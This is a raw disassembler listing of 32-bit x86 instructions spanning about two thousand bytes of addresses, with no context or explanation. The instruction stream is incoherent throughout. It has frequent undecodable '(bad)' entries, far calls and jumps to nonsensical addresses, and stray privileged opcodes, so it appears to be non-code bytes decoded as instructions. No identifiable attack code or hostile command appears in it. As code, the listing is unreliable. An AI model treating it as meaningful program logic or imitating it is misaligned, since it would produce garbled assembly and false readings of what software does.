  43275a:	push   ecx
  43275b:	add    ax,0x72cb
  43275f:	cmp    al,BYTE PTR [eax]
  432761:	add    BYTE PTR [ebp+0x66],al
  432764:	(bad)  
  432765:	retf   
  432766:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  43276d:	retf   
  43276e:	cmp    eax,ecx
  432770:	pushf  
  432771:	jge    0x43273a
  432773:	ss cld 
  432775:	pushf  
  432776:	test   DWORD PTR [edi-0x8],ebx
  432779:	je     0x4327c0
  43277b:	xor    esi,DWORD PTR ds:0x7020840
  432781:	ror    BYTE PTR [ebp-0x37],0x8d
  432785:	push   ebp
  432786:	add    esp,ebp
  432788:	jb     0x432715
  43278a:	add    BYTE PTR [eax],cl
  43278c:	dec    ebp
  43278d:	mov    bh,0x81
  43278f:	push   esi
  432790:	push   ebx
  432791:	adc    DWORD PTR [ecx-0x3b],0x3a9aff81
  432798:	xor    al,BYTE PTR [eax]
  43279a:	mov    edx,DWORD PTR [edi+0x10]
  43279d:	(bad)  
  43279e:	scas   eax,DWORD PTR es:[edi]
  43279f:	cmp    bh,BYTE PTR [ebx]
  4327a1:	add    BYTE PTR [edi],cl
  4327a3:	mov    ebp,ebp
  4327a5:	cld    
  4327a6:	add    BYTE PTR [ebx],bh
  4327a8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4327ac:	dec    ebp
  4327ad:	or     BYTE PTR [ebx],ch
  4327af:	ret    0x458b
  4327b2:	lock jmp 0x4327a6
  4327b5:	mov    ecx,DWORD PTR [eax]
  4327b7:	or     BYTE PTR [edi],al
  4327b9:	mov    ecx,eax
  4327bb:	xor    DWORD PTR [edx+0x2],0x0
  4327bf:	mov    bh,0xc1
  4327c1:	adc    BYTE PTR [eax],dh
  4327c3:	iret   
  4327c4:	inc    ebp
  4327c5:	mov    DWORD PTR [ebx],0x4dfff8c5
  4327cb:	inc    BYTE PTR [ebx]
  4327cd:	cmp    bh,al
  4327cf:	add    BYTE PTR [ecx],dl
  4327d1:	data16 adc al,bh
  4327d4:	dec    ecx
  4327d5:	fisttp WORD PTR [ecx+0x456604c0]
  4327db:	add    dh,BYTE PTR ds:0x75e0845
  4327e1:	ret    0x4d
  4327e4:	lea    ecx,[ebx+0x18728301]
  4327ea:	add    BYTE PTR [ebp+0x45],al
  4327ed:	xor    eax,0xc7009ce9
  4327f2:	add    al,ch
  4327f4:	inc    ebp
  4327f5:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4327fb:	xor    eax,0x781084d
  432800:	push   ebx
  432801:	call   0xf89a:0x89813251
  432808:	xor    al,BYTE PTR [ebp+0x3b]
  43280b:	cmp    eax,0xc78b9c76
  432810:	or     ah,dh
  432812:	inc    ebp
  432813:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432819:	cmp    ecx,DWORD PTR [ebx-0x74747664]
  43281f:	in     al,dx
  432820:	hlt    
  432821:	push   ebx
  432822:	push   ebx
  432823:	push   ecx
  432824:	push   ecx
  432825:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43282b:	call   0xe889:0x8b32329a
  432832:	clc    
  432833:	icebp  
  432834:	pop    ebx
  432835:	or     BYTE PTR [ebp+0x7],al
  432838:	mov    eax,ecx
  43283a:	clc    
  43283b:	jb     0x4327fe
  43283d:	add    BYTE PTR [ebp+0x55],cl
  432840:	or     DWORD PTR [edi],0xc251d153
  432846:	add    DWORD PTR [ebx+0x32009a],0x8b76453b
  432850:	mov    edi,eax
  432852:	or     cl,al
  432854:	inc    ebp
  432855:	dec    ebp
  432856:	mov    eax,DWORD PTR [ecx+0x514d530c]
  43285c:	or     WORD PTR [ecx],0x899a
  432861:	xor    cl,BYTE PTR [ebx+0x5376fc3b]
  432867:	mov    edx,DWORD PTR [ecx+0x8]
  43286a:	mov    eax,DWORD PTR [ebp-0x8]
  43286d:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb266]
  432874:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  43287a:	inc    ebp
  43287b:	dec    eax
  43287c:	add    ecx,DWORD PTR [ebx+0x534df0f8]
  432882:	add    edx,DWORD PTR [ecx-0x8]
  432885:	mov    ecx,DWORD PTR [ecx]
  432887:	clc    
  432888:	or     BYTE PTR [ebp+eax*2+0x4532409a],al
  43288f:	mov    ecx,ebp
  432891:	clc    
  432892:	(bad)  
  432893:	popf   
  432894:	inc    DWORD PTR [eax]
  432896:	ret    0x8b
  432899:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  43289f:	mov    edi,esp
  4328a1:	hlt    
  4328a2:	test   ecx,esi
  4328a4:	clc    
  4328a5:	or     BYTE PTR [ebp+0x7],al
  4328a8:	xor    al,0xc1
  4328aa:	pushf  
  4328ab:	jb     0x4328e0
  4328ad:	add    BYTE PTR [eax-0x3f],al
  4328b0:	inc    eax
  4328b1:	daa    
  4328b2:	inc    ebp
  4328b3:	inc    ebp
  4328b4:	xor    eax,0x7f80803
  4328b9:	dec    ebp
  4328ba:	call   0xc09:0x39f83203
  4328c1:	or     BYTE PTR [edx],al
  4328c3:	inc    ebp
  4328c4:	sub    al,0x35
  4328c6:	inc    ebp
  4328c7:	or     BYTE PTR ds:0x74d0807,dh
  4328cd:	lea    ebx,[edx-0x748dcdff]
  4328d3:	add    BYTE PTR [eax*2-0x74b21438],cl
  4328da:	mov    edx,DWORD PTR [eax]
  4328dc:	cld    
  4328dd:	dec    ebp
  4328de:	push   ebx
  4328df:	sub    edx,DWORD PTR [ecx-0x75]
  4328e2:	add    eax,0xf172fc
  4328e7:	or     BYTE PTR [ebp+0x7],cl
  4328ea:	add    eax,ecx
  4328ec:	or     al,0x72
  4328ee:	add    DWORD PTR [eax],eax
  4328f0:	mov    ebx,0x29c2c1
  4328f5:	inc    ebp
  4328f6:	mov    eax,DWORD PTR [ebx]
  4328f8:	cmp    eax,0x3004d1c
  4328fe:	xbegin 0x66c8b4f8
  432904:	clc    
  432905:	or     BYTE PTR [ebp+0x45],al
  432908:	xor    al,0x35
  43290a:	pushf  
  43290b:	or     BYTE PTR [ebx+0x454d1007],cl
  432911:	lea    eax,[ebp+0x33727501]
  432917:	add    cl,ch
  432919:	inc    ebp
  43291a:	add    bl,ch
  43291c:	add    BYTE PTR [ebx+0x45850845],cl
  432922:	je     0x4328af
  432924:	push   ebx
  432925:	or     al,0x85
  432927:	dec    ebp
  432928:	std    
  432929:	mov    bh,bh
  43292b:	mov    BYTE PTR [ebp-0x75],al
  43292e:	mov    edi,eax
  432930:	or     al,0x89
  432932:	inc    ebp
  432933:	clc    
  432934:	mov    esp,esp
  432936:	hlt    
  432937:	call   DWORD PTR [edi-0x37]
  43293a:	push   ebx
  43293b:	or     al,0x51
  43293d:	push   ebp
  43293e:	xor    ebp,esp
  432940:	mov    esi,0x457251
  432945:	xor    eax,0xc7459cc6
  43294a:	mov    edi,eax
  43294c:	or     al,0x85
  43294e:	add    al,bh
  432950:	inc    eax
  432952:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432956:	or     ah,bh
  432958:	inc    eax
  432959:	push   ebx
  43295a:	jmp    0x4329ad
  43295c:	mov    eax,DWORD PTR ds:0xe8720c
  432962:	mov    DWORD PTR [ebp-0x8],eax
  432965:	jne    0x4329ac
  432967:	jmp    0x4328f4
  432969:	mov    ebp,DWORD PTR [eax]
  43296b:	clc    
  43296c:	retf   0xff53
  43296f:	push   ecx
  432970:	mov    DWORD PTR ds:0x757210,eax
  432976:	mov    ecx,DWORD PTR [ebp-0x4]
  432979:	sub    esp,DWORD PTR [ebx-0x77]
  43297c:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432983:	or     ah,bh
  432985:	pop    es
  432986:	ds call 0x8f0:0x8b8b32ff
  43298e:	(bad)  
  43298f:	dec    ebp
  432990:	(bad)  
  432991:	mov    bh,bh
  432993:	jmp    0x432981
  432995:	leave  
  432996:	jne    0x4329a0
  432998:	call   0x3022f2
  43299d:	in     al,dx
  43299e:	dec    ebp
  43299f:	add    dh,BYTE PTR [ebx]
  4329a1:	add    BYTE PTR [ebx],al
  4329a3:	inc    ebp
  4329a4:	cmp    esi,DWORD PTR ds:0xc78b9c74
  4329aa:	or     al,0xf0
  4329ac:	add    BYTE PTR [ebp+0x458bf845],al
  4329b2:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4329b8:	adc    al,0x7
  4329ba:	enter  0x9fc0,0xa5
  4329be:	rol    BYTE PTR [eax],0x5e
  4329c1:	mov    ecx,ecx
  4329c3:	or     al,0xc
  4329c5:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  4329cc:	jmp    0x4329cd
  4329ce:	push   ebp
  4329cf:	mov    esp,ebp
  4329d1:	cld    
  4329d2:	inc    ebp
  4329d3:	inc    ebp
  4329d4:	or     DWORD PTR [ecx+0x457dec10],0x0
  4329db:	push   esi
  4329dc:	push   esi
  4329dd:	mov    edi,0x7af080f
  4329e2:	add    bh,al
  4329e4:	test   DWORD PTR [edx+0x3a7320f],ebx
  4329ea:	add    BYTE PTR [ecx+0x4540100f],cl
  4329f0:	mov    ebp,eax
  4329f2:	mov    ebp,edi
  4329f4:	lock call edx
  4329f7:	fcom   DWORD PTR [ebp+0x45]
  4329fa:	mov    eax,0x148a8b
  4329ff:	push   ecx
  432a00:	enter  0xc145,0x83
  432a04:	cmp    ecx,DWORD PTR [eax]
  432a06:	add    BYTE PTR [ebp+0x4d],al
  432a09:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432a0f:	call   0xffa3257e
  432a14:	cmp    eax,DWORD PTR [ebp-0xc]
  432a17:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432a1b:	push   ebp
  432a1c:	(bad)
  432a1f:	std    
  432a20:	lock push DWORD PTR [edi+0x5d08fcdb]
  432a27:	inc    ebp
  432a28:	(bad)  
  432a29:	call   0xff7d26b9
  432a2e:	add    al,BYTE PTR [ebp+0x37]
  432a31:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  432a37:	jne    0x432a39
  432a39:	(bad)  
  432a3a:	cmp    edi,esp
  432a3c:	jne    0x432a6f
  432a3e:	mov    edi,edi
  432a40:	or     BYTE PTR [ebx-0x307f0b49],cl
  432a46:	pop    ds
  432a47:	into   
  432a48:	je     0x432a0b
  432a4a:	mov    ebx,DWORD PTR [esi]
  432a4c:	or     BYTE PTR [ebp-0x49],al
  432a4f:	mov    esp,DWORD PTR [esi-0x77]
  432a52:	mov    esi,0x451f0c
  432a57:	mov    eax,DWORD PTR [eax]
  432a59:	or     al,0x66
  432a5b:	sar    bl,0x3b
  432a5e:	xor    esi,DWORD PTR [ebp+0x66]
  432a61:	xor    ecx,edi
  432a63:	pop    edi
  432a64:	adc    bl,BYTE PTR [ebx+0x7c]
  432a67:	ret    0xff
  432a6a:	cld    
  432a6b:	inc    ebp
  432a6c:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432a72:	cld    
  432a73:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432a7a:	push   0xffffff83
  432a7c:	pop    edi
  432a7d:	or     BYTE PTR [ebp+0x53],dh
  432a80:	xorps  xmm1,xmm2
  432a83:	test   BYTE PTR [eax+eax*1],bh
  432a86:	add    BYTE PTR [eax],al
  432a88:	adc    eax,eax
  432a8a:	add    DWORD PTR [esp+edi*2-0xff7b00],0xffffffb7
  432a92:	jmp    DWORD PTR [eax]
  432a94:	ror    al,0x5e
  432a97:	inc    ebp
  432a98:	leave  
  432a99:	xor    ecx,DWORD PTR [eax]
  432a9b:	and    DWORD PTR [ebx-0x3ec50708],ecx
  432aa1:	add    ch,al
  432aa3:	xor    edi,edi
  432aa5:	xor    DWORD PTR [ebx],0x66003300
  432aab:	mov    DWORD PTR [ebp-0xc],ecx
  432aae:	pcmpgtw mm0,mm0
  432ab1:	add    dl,ah
  432ab3:	leave  
  432ab4:	mov    edi,DWORD PTR [esi-0x7d]
  432ab7:	push   ax
  432ab9:	dec    ebp
  432aba:	mov    esi,DWORD PTR [ebx-0x75]
  432abd:	lea    ebp,[eax-0x7c010000]
  432ac3:	xor    eax,DWORD PTR [eax]
  432ac5:	sysret 
  432ac7:	dec    ebp
  432ac8:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432acf:	push   WORD PTR [ecx+0x8]
  432ad3:	jne    0x432a96
  432ad5:	ud0    ecx,DWORD PTR [ecx]
  432ad8:	mov    edi,DWORD PTR [edx]
  432ada:	lods   al,BYTE PTR ds:[esi]
  432adb:	add    BYTE PTR [eax],al
  432add:	data16 (bad) 
  432adf:	iret   
  432ae0:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432ae7:	cli    
  432ae8:	inc    ebp
  432ae9:	cmp    al,0x8d
  432aeb:	add    BYTE PTR [esi+0x2d],ah
  432aee:	inc    ebp
  432aef:	pop    ebp
  432af0:	lea    ecx,[edi]
  432af2:	mov    dl,bh
  432af4:	add    BYTE PTR [edi],cl
  432af6:	mov    DWORD PTR [eax+eax*8],edi
  432af9:	mov    ebx,0x3b87
  432afe:	add    BYTE PTR [ebx],ch
  432b00:	inc    ebp
  432b01:	data16 (bad) 
  432b03:	clc    
  432b04:	int3   
  432b05:	cmp    eax,DWORD PTR [eax]
  432b07:	je     0x432a92
  432b09:	push   0xffffffc8
  432b0b:	pop    edi
  432b0c:	xchg   DWORD PTR [ebp+0x0],eax
  432b0f:	data16 add BYTE PTR [ebp+0x45],cl
  432b13:	lea    cx,[ebp+0x10]
  432b17:	jb     0x432b19
  432b19:	jmp    0x432aa4
  432b1b:	call   eax
  432b1d:	clc    
  432b1e:	xchg   DWORD PTR [edi+0x1],edi
  432b21:	mov    eax,DWORD PTR [eax]
  432b23:	or     BYTE PTR [ebp-0x49],al
  432b26:	lea    eax,[eax+0x74003154]
  432b2c:	push   edi
  432b2d:	inc    edx
  432b2e:	jge    0x432b2f
  432b30:	mov    DWORD PTR [edi],ecx
  432b32:	fdiv   DWORD PTR [edi-0x6]
  432b35:	inc    DWORD PTR [eax]
  432b37:	xor    edx,DWORD PTR [eax+0x5f]
  432b3a:	xchg   DWORD PTR [ebx+0x1],ebx
  432b3d:	ret    0x0
  432b40:	xor    BYTE PTR [ebp-0x51],cl
  432b43:	cmp    edi,0xf0ff8900
  432b49:	data16 ror al,0x84
  432b4d:	rol    BYTE PTR [eax],0x3b
  432b50:	add    al,dh
  432b52:	dec    eax
  432b53:	xchg   esp,eax
  432b54:	push   ebx
  432b55:	jmp    0x432ae2
  432b57:	push   ebp
  432b58:	add    esp,ebp
  432b5a:	add    ebp,esp
  432b5c:	mov    edx,DWORD PTR [edi+0x24]
  432b5f:	clc    
  432b60:	dec    esi
  432b61:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432b67:	cmp    BYTE PTR [ebx],al
  432b69:	jne    0x432af4
  432b6b:	xor    esp,eax
  432b6d:	jmp    0x462cf0
  432b72:	add    ebp,DWORD PTR [ecx+ecx*4]
  432b75:	jne    0x432b6b
  432b77:	call   0xffcd28d1
  432b7c:	clc    
  432b7d:	xchg   edi,eax
  432b7e:	sti    
  432b7f:	add    DWORD PTR [ebx],eax
  432b81:	add    BYTE PTR [ebp+0x47],bl
  432b84:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432b8a:	pop    ebp
  432b8b:	mov    DWORD PTR [esi-0x48],esi
  432b8e:	jmp    0x432bd7
  432b90:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432b96:	(bad)  
  432b98:	cmp    al,0x0
  432b9a:	cmp    eax,DWORD PTR [ebp+0x18]
  432b9d:	lea    ebx,[ebp-0x56]
  432ba0:	jle    0x432ba2
  432ba2:	jae    0x432b2d
  432ba4:	mov    eax,esp
  432ba6:	call   0xb900:0x8b005587
  432bad:	inc    ebp
  432bae:	push   ebp
  432baf:	lea    ecx,[ebp-0x27ff4f12]
  432bb5:	mov    eax,edi
  432bb7:	int3   
  432bb8:	push   ebp
  432bb9:	xchg   edi,eax
  432bbb:	add    esp,ebp
  432bbd:	add    BYTE PTR [eax],al
  432bbf:	inc    ebp
  432bc0:	add    BYTE PTR [ebp+0x8b3255],cl
  432bc6:	cld    
  432bc7:	mov    DWORD PTR [edx],edi
  432bc9:	aam    0x75
  432bcb:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432bd1:	mov    DWORD PTR [ebx-0x50],edx
  432bd4:	test   BYTE PTR [ebp-0x1],0xe8
  432bd8:	mov    eax,DWORD PTR [eax]
  432bda:	hlt    
  432bdb:	add    al,al
  432bdd:	mov    eax,DWORD PTR ds:0x890045a8
  432be3:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432be9:	inc    DWORD PTR [eax*2+0xf75854d]
  432bf0:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432bf6:	call   0x72998937
  432bfb:	je     0x432c5b
  432bfd:	js     0x432c5e
  432bff:	lock ret 0x7e
  432c03:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432c09:	mov    edi,edi
  432c0b:	sbb    al,bl
  432c0d:	clc    
  432c0e:	add    BYTE PTR [ebp-0x73],bh
  432c11:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432c17:	ror    BYTE PTR [eax],1
  432c19:	dec    ebp
  432c1a:	xchg   ebp,eax
  432c1b:	mov    edi,edi
  432c1d:	in     al,0x8b
  432c1f:	jge    0x432baa
  432c21:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432c27:	clc    
  432c28:	pop    esi
  432c29:	fist   DWORD PTR [ebp+0x5d398b5d]
  432c2f:	clc    
  432c30:	add    al,0x6e
  432c32:	mov    eax,DWORD PTR [ebx]
  432c34:	mov    BYTE PTR [ebp+0x0],dl
  432c37:	mov    edx,DWORD PTR [ebx-0x20]
  432c3a:	adc    esi,DWORD PTR [edi+0x5e005f3a]
  432c40:	add    eax,0x3b3b73
  432c45:	adc    al,0x89
  432c47:	pop    eax
  432c48:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432c4c:	ret    0xf08
  432c4f:	cmp    al,0x2
  432c51:	mov    DWORD PTR [edx],edi
  432c53:	cld    
  432c54:	add    BYTE PTR [ebp+0x66],dl
  432c57:	add    eax,ebx
  432c59:	add    esp,eax
  432c5b:	sub    eax,eax
  432c5d:	or     BYTE PTR [ecx-0x77f474bb],cl
  432c63:	add    BYTE PTR [eax],al
  432c65:	mov    DWORD PTR [ebx-0x24],ebx
  432c68:	push   edi
  432c69:	push   ebp
  432c6a:	clc    
  432c6b:	add    DWORD PTR [esi+0x1b0100],0x45
  432c72:	out    0xff,eax
  432c74:	add    edx,DWORD PTR [eax]
  432c76:	jmp    0x432c60
  432c78:	cmp    ch,0x45
  432c7b:	(bad)  
  432c7c:	jmp    0x40c8b4ce
  432c81:	je     0x432c0d
  432c83:	mov    eax,DWORD PTR [eax-0x10c78304]
  432c89:	inc    ebp
  432c8a:	add    BYTE PTR [ebx-0x770375],al
  432c90:	add    ah,ch
  432c92:	add    edx,esp
  432c94:	pop    edi
  432c95:	pop    ebp
  432c96:	push   ebp
  432c97:	inc    ebx
  432c98:	in     al,dx
  432c99:	pop    ebp
  432c9a:	in     al,dx
  432c9b:	cmp    edx,DWORD PTR [edi-0x8]
  432c9e:	xor    eax,0x895b9c94
  432ca3:	leave  
  432ca4:	call   0x899873ad
  432ca9:	in     al,dx
  432caa:	in     al,0x45
  432cac:	dec    ebp
  432cad:	push   esi
  432cae:	test   DWORD PTR [eax+0xfb010f],esi
  432cb4:	add    BYTE PTR [eax+0xc018b],dh
  432cba:	leave  
  432cbb:	inc    ebp
  432cbc:	test   al,ch
  432cbe:	add    dh,bh
  432cc0:	add    bh,bh
  432cc2:	dec    ebp
  432cc3:	push   cs
  432cc4:	mov    DWORD PTR [ecx],eax
  432cc6:	hlt    
  432cc7:	push   es
  432cc8:	dec    ebp
  432cc9:	leave  
  432cca:	mov    DWORD PTR [eax],ecx
  432ccc:	clc    
  432ccd:	cmovge eax,ecx
  432cd0:	mov    ecx,0x85c2f0
  432cd6:	clc    
  432cd7:	pop    DWORD PTR [ebp+0x1]
  432cda:	push   ebx
  432cdb:	add    BYTE PTR [ebp-0x15],bh
  432cde:	push   esi
  432cdf:	xor    eax,0x898a45
  432ce4:	cld    
  432ce5:	add    BYTE PTR [ebp+0x0],al
  432ce8:	cmp    esp,DWORD PTR [esi-0x64]
  432ceb:	add    DWORD PTR [esi+0x78308c1],edi
  432cf1:	add    ah,BYTE PTR [esi-0x49]
  432cf4:	int    0xbb
  432cf6:	mov    ecx,DWORD PTR [edi+0xc]
  432cf9:	add    dh,al
  432cfb:	cmp    ecx,ebx
  432cfd:	jne    0x432cc7
  432cff:	xor    ecx,DWORD PTR [ebp+0x66]
  432d02:	jmp    0xca2d08
  432d07:	add    DWORD PTR [ebp+0x0],eax
  432d0a:	mov    eax,ebx
  432d0c:	or     al,0x8b
  432d0e:	(bad)  
  432d0f:	mov    ecx,esi
  432d11:	mov    BYTE PTR [eax+eax*1+0x664c134],cl
  432d18:	mov    eax,edi
  432d1a:	or     BYTE PTR [edx],cl
  432d1c:	shl    cl,cl
  432d1e:	icebp  
  432d1f:	add    BYTE PTR [ebp+0x39],0x8b
  432d23:	or     BYTE PTR [edx+eax*2],cl
  432d26:	(bad)  
  432d27:	or     cl,dh
  432d29:	stc    
  432d2a:	shl    DWORD PTR [ebp-0x30],0xc6
  432d2e:	xor    al,0x0
  432d30:	inc    ebp
  432d31:	xchg   BYTE PTR [ebx],al
  432d33:	add    esp,edi
  432d35:	add    BYTE PTR [ebp-0x39],cl
  432d38:	mov    al,bl
  432d3a:	test   DWORD PTR [ebx+0x1c348375],ecx
  432d40:	sub    al,0xbf
  432d42:	jmp    0x432cc9
  432d44:	mov    edi,eax
  432d46:	lock jge 0x432d3a
  432d49:	lea    esi,[edx-0x74bad501]
  432d4f:	mov    ebp,esp
  432d51:	or     cl,dh
  432d53:	leave  
  432d54:	add    al,BYTE PTR [eax+eax*4-0x37ff9a00]
  432d5b:	dec    ebp
  432d5c:	dec    ebp
  432d5d:	test   DWORD PTR [ebx],eax
  432d5f:	paddb  mm6,mm0
  432d62:	add    DWORD PTR [eax],eax
  432d64:	dec    ebp
  432d65:	mov    ecx,DWORD PTR [ebx-0x65b217f0]
  432d6b:	mov    esi,DWORD PTR [edx]
  432d6d:	or     al,0x2b
  432d6f:	dec    ebp
  432d70:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432d76:	mov    esp,eax
  432d78:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432d7f:	mov    DWORD PTR [ebx],ebp
  432d81:	call   0xc76b6b1
  432d86:	mov    DWORD PTR [ebp+0x10],ecx
  432d89:	(bad)  
  432d8a:	push   0x8b85ff10
  432d8f:	clc    
  432d90:	or     al,0x53
  432d92:	(bad)  
  432d93:	push   ecx
  432d94:	retf   
  432d95:	mov    ebx,0xff4d8dc8
  432d9a:	mov    DWORD PTR [ebp+0x8],eax
  432d9d:	xor    eax,DWORD PTR [ebp-0x75]
  432da0:	cmp    ebp,DWORD PTR [ebx]
  432da2:	lsl    ebx,WORD PTR [edi-0x8]
  432da6:	call   DWORD PTR [ebx-0x741bff75]
  432dac:	(bad)  
  432dad:	or     al,0x5b
  432daf:	dec    ebp
  432db0:	or     BYTE PTR [ebx],dh
  432db2:	inc    ebp
  432db3:	xor    esi,DWORD PTR ds:0x708088d
  432db9:	in     eax,0x9a
  432dbb:	add    BYTE PTR [edx],dh
  432dbd:	inc    ebp
  432dbe:	pop    edi
  432dbf:	xor    eax,edx
  432dc1:	test   DWORD PTR [eax],0x81108b8b
  432dc7:	dec    ebp
  432dc8:	sub    al,0x33
  432dca:	add    BYTE PTR [ebx],dh
  432dcc:	push   esi
  432dcd:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432dd3:	mov    edi,eax
  432dd5:	or     BYTE PTR [ebp+0x45],al
  432dd8:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432dde:	xor    eax,0xc7069cc9
  432de3:	inc    ebp
  432de4:	cld    
  432de5:	cmp    DWORD PTR [ebp+0x454df817],eax
  432deb:	cmp    BYTE PTR ds:0xc7669c53,0xd1
  432df2:	in     al,0x4d
  432df4:	xchg   BYTE PTR [eax-0x3dbaac08],al
  432dfa:	aad    0xe9
  432dfc:	xlat   BYTE PTR ds:[ebx]
  432dfd:	rol    bh,cl
  432dff:	mov    edx,esp
  432e01:	or     BYTE PTR [ebp+0x4588f84d],al
  432e07:	mov    ecx,DWORD PTR [eax]
  432e09:	or     BYTE PTR [eax],al
  432e0b:	push   ebp
  432e0c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432e12:	dec    ebp
  432e13:	enter  0xceba,0x8
  432e17:	retf   0x1807
  432e1a:	ret    0x9a4d
  432e1d:	mov    esi,DWORD PTR [edx]
  432e1f:	or     al,0x33
  432e21:	into   
  432e22:	add    edx,esi
  432e24:	add    ecx,edx
  432e26:	bswap  eax
  432e28:	ror    esi,0x98
  432e2b:	dec    ebp
  432e2c:	add    cl,ch
  432e2e:	mov    edi,edi
  432e30:	hlt    
  432e31:	inc    esi
  432e33:	inc    ebp
  432e34:	ret    0x4533
  432e37:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432e3d:	or     BYTE PTR [ebx],dh
  432e3f:	dec    ebp
  432e40:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432e46:	jne    0xff8d2e0d
  432e4c:	inc    ebp
  432e4d:	inc    ebp
  432e4e:	mov    esi,DWORD PTR [ebx]
  432e50:	clc    
  432e51:	pop    esi
  432e52:	ret    0xcaeb
  432e55:	mov    eax,esi
  432e57:	call   0x5204822a
  432e5c:	dec    ebp
  432e5d:	add    eax,0xf8728b
  432e62:	adc    eax,0xce0ccac9
  432e67:	push   ebp
  432e68:	ret    0xc6ec
  432e6b:	in     al,dx
  432e6c:	call   0x33437b75
  432e71:	push   edi
  432e72:	add    edi,eax
  432e74:	xor    eax,eax
  432e76:	jmp    0x432ebd
  432e78:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432e7e:	add    eax,edi
  432e80:	shr    eax,cl
  432e82:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432e88:	mov    esi,DWORD PTR [esp+ebp*8]
  432e8b:	pushf  
  432e8c:	ret    0x84c7
  432e8f:	fcomp  DWORD PTR [edx-0x7607cd7b]
  432e95:	inc    ebp
  432e96:	in     al,dx
  432e97:	xor    eax,0xc78b9c45
  432e9c:	cld    
  432e9d:	fmul   st(2),st
  432e9f:	sbb    dl,al
  432ea1:	jmp    0x9c3b:0x364d45c1
  432ea8:	jbe    0x432e71
  432eaa:	mov    esp,eax
  432eac:	clc    
  432ead:	add    BYTE PTR [ebp+0x0],cl
  432eb0:	mov    ecx,ecx
  432eb2:	lea    eax,[ebp-0x5]
  432eb5:	mov    edi,edi
  432eb7:	call   0x51ce8201
  432ebc:	hlt    
  432ebd:	xor    eax,edx
  432ebf:	mov    esi,0x9a7284
  432ec4:	xor    cl,dl
  432ec6:	mov    esi,eax
  432ec8:	hlt    
  432ec9:	into   
  432eca:	inc    ebp
  432ecb:	scas   eax,DWORD PTR es:[edi]
  432ecc:	mov    ebp,ecx
  432ece:	cld    
  432ecf:	add    dl,cl
  432ed1:	add    dl,al
  432ed3:	inc    ebp
  432ed4:	shr    DWORD PTR [ebx],0x4d
  432ed7:	xor    edi,DWORD PTR [ebx]
  432ed9:	mov    DWORD PTR [edi],ecx
  432edb:	clc    
  432edc:	dec    esi
  432edd:	inc    ebp
  432ede:	dec    DWORD PTR [ebx-0x3d2b1775]
  432ee4:	ret    0xc6ca
  432ee7:	mov    BYTE PTR [ebp-0x32],0x53
  432eeb:	scas   eax,DWORD PTR es:[edi]
  432eec:	inc    ebp
  432eed:	jmp    0x432f25
  432eef:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432ef6:	pop    ebx
  432ef7:	xor    ecx,DWORD PTR [ebp+0x3]
  432efa:	mov    eax,DWORD PTR [ebx]
  432efc:	clc    
  432efd:	test   edx,ecx
  432eff:	mov    ecx,esi
  432f01:	cld    
  432f02:	call   0x8ab7744c
  432f07:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432f0d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432f13:	fdiv   QWORD PTR [ebx]
  432f15:	retf   0xce89
  432f18:	in     al,0xc1
  432f1a:	inc    ebp
  432f1b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432f21:	into   
  432f22:	mov    dh,0xc1
  432f25:	call   0x8c1774ae
  432f2a:	(bad)  
  432f2b:	cld    
  432f2c:	mov    ecx,DWORD PTR [ebp-0x14]
  432f2f:	xor    eax,ecx
  432f31:	lea    eax,[ebp+0x8]
  432f34:	mov    esi,DWORD PTR [edx-0x4]
  432f37:	add    dl,al
  432f39:	inc    ebp
  432f3a:	mov    esp,0x32d89a8b
  432f3f:	dec    ebp
  432f40:	mov    esi,DWORD PTR [ebx]
  432f42:	cld    
  432f43:	xor    eax,edx
  432f45:	sub    esp,DWORD PTR [esi-0x75]
  432f48:	int    0xec
  432f4a:	sub    ecx,eax
  432f4c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432f52:	mov    esi,esp
  432f54:	call   0x34177cdd
  432f59:	inc    DWORD PTR [ebx]
  432f5b:	mov    edi,DWORD PTR [ebx]
  432f5d:	cld    
  432f5e:	jne    0x432fad
  432f60:	mov    esi,DWORD PTR [ebx]
  432f62:	aam    0x8d
  432f64:	dec    ebp
  432f65:	or     BYTE PTR [ebx],dh
  432f67:	jb     0x432f6c
  432f69:	add    BYTE PTR [edi+0x45],bl
  432f6c:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432f73:	xor    ebp,esp
  432f75:	xor    eax,edi
